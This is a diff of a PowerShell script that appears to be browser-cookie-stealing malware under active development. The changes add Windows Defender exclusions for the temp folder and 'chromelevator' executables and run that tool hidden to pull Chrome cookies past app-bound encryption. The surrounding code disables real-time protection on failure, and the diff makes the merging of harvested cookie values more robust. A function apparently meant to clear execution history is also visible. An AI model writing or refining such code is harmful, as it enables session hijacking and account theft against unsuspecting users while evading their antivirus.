@@ -197,10 +197,10 @@ if (-not $UseChromelevator -and $ChromeInfo.AppBoundSupported -and -not $IsRunni
 
 function Initialize-ChromelevatorDefenderAllowlist {
     New-Item -ItemType Directory -Path $ChromelevatorCacheDir -Force | Out-Null
-    Add-DefenderAllowlistEntry -Path $ChromelevatorCacheDir
-    Add-DefenderAllowlistEntry -Path $env:TEMP
+    Add-DefenderAllowlistEntry -Path $ChromelevatorCacheDir | Out-Null
+    Add-DefenderAllowlistEntry -Path $env:TEMP | Out-Null
     foreach ($processName in @("chromelevator_x64.exe", "chromelevator_arm64.exe", "chromelevator.exe")) {
-        Add-DefenderAllowlistEntry -ProcessName $processName
+        Add-DefenderAllowlistEntry -ProcessName $processName | Out-Null
     }
 }
 
@@ -261,11 +261,24 @@ function Invoke-ChromelevatorProcess {
 
     Protect-ChromelevatorBinary -ElevatorPath $ElevatorPath
 
-    $argumentList = @("chrome", "-o", $OutDir)
+    function Start-ChromelevatorExe {
+        param([string]$Path, [string]$OutputDir)
+
+        $process = New-Object System.Diagnostics.Process
+        $process.StartInfo.FileName = $Path
+        $process.StartInfo.Arguments = "chrome -o `"$OutputDir`""
+        $process.StartInfo.UseShellExecute = $false
+        $process.StartInfo.CreateNoWindow = $true
+        $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        [void]$process.Start()
+        $process.WaitForExit()
+        return $process.ExitCode
+    }
+
     try {
-        $proc = Start-Process -FilePath $ElevatorPath -ArgumentList $argumentList -Wait -PassThru -WindowStyle Hidden
-        if ($proc.ExitCode -ne 0) {
-            throw "chromelevator exited with code $($proc.ExitCode)"
+        $exitCode = Start-ChromelevatorExe -Path $ElevatorPath -OutputDir $OutDir
+        if ($exitCode -ne 0) {
+            throw "chromelevator exited with code $exitCode"
         }
         return
     }
@@ -284,9 +297,9 @@ function Invoke-ChromelevatorProcess {
         Write-Host "[DEBUG] Real-time protection disabled temporarily"
         Start-Sleep -Seconds 2
         Protect-ChromelevatorBinary -ElevatorPath $ElevatorPath
-        $proc = Start-Process -FilePath $ElevatorPath -ArgumentList $argumentList -Wait -PassThru -WindowStyle Hidden
-        if ($proc.ExitCode -ne 0) {
-            throw "chromelevator exited with code $($proc.ExitCode)"
+        $exitCode = Start-ChromelevatorExe -Path $ElevatorPath -OutputDir $OutDir
+        if ($exitCode -ne 0) {
+            throw "chromelevator exited with code $exitCode"
         }
     }
     catch {
@@ -401,6 +414,21 @@ function Merge-ChromelevatorCookies {
         }
 
         foreach ($entry in $entries) {
+            $expiresVal = 0
+            if ($null -ne $entry.expires) {
+                try { $expiresVal = [long]$entry.expires } catch { $expiresVal = 0 }
+            }
+
+            $secureVal = $null
+            if ($null -ne $entry.secure) {
+                try { $secureVal = [bool]$entry.secure } catch { $secureVal = $null }
+            }
+
+            $httpOnlyVal = $null
+            if ($null -ne $entry.httpOnly) {
+                try { $httpOnlyVal = [bool]$entry.httpOnly } catch { $httpOnlyVal = $null }
+            }
+
             $cookies.Add([pscustomobject]@{
                 index = $index
                 profile = $profileDir.Name
@@ -409,9 +437,9 @@ function Merge-ChromelevatorCookies {
                 path = [string]$entry.path
                 value = [string]$entry.value
                 value_dpapi = [string]$entry.value
-                expires = [long]$entry.expires
-                secure = $null
-                httpOnly = $null
+                expires = $expiresVal
+                secure = $secureVal
+                httpOnly = $httpOnlyVal
             })
             $index++
         }
@@ -505,11 +533,11 @@ function Invoke-ChromelevatorExtraction {
             $meta.error = "chromelevator not required for this Chrome version"
             Write-Host "[DEBUG] chromelevator skipped"
         }
-        return $meta
+        return ,[pscustomobject]$meta
     }
 
     if ($IsRunningAsAdmin) {
-        Initialize-ChromelevatorDefenderAllowlist
+        Initialize-ChromelevatorDefenderAllowlist | Out-Null
     }
 
     $outDir = $null
@@ -553,7 +581,7 @@ function Invoke-ChromelevatorExtraction {
         }
     }
 
-    return $meta
+    return ,[pscustomobject]$meta
 }
 
 function Clear-ScriptExecutionHistory {
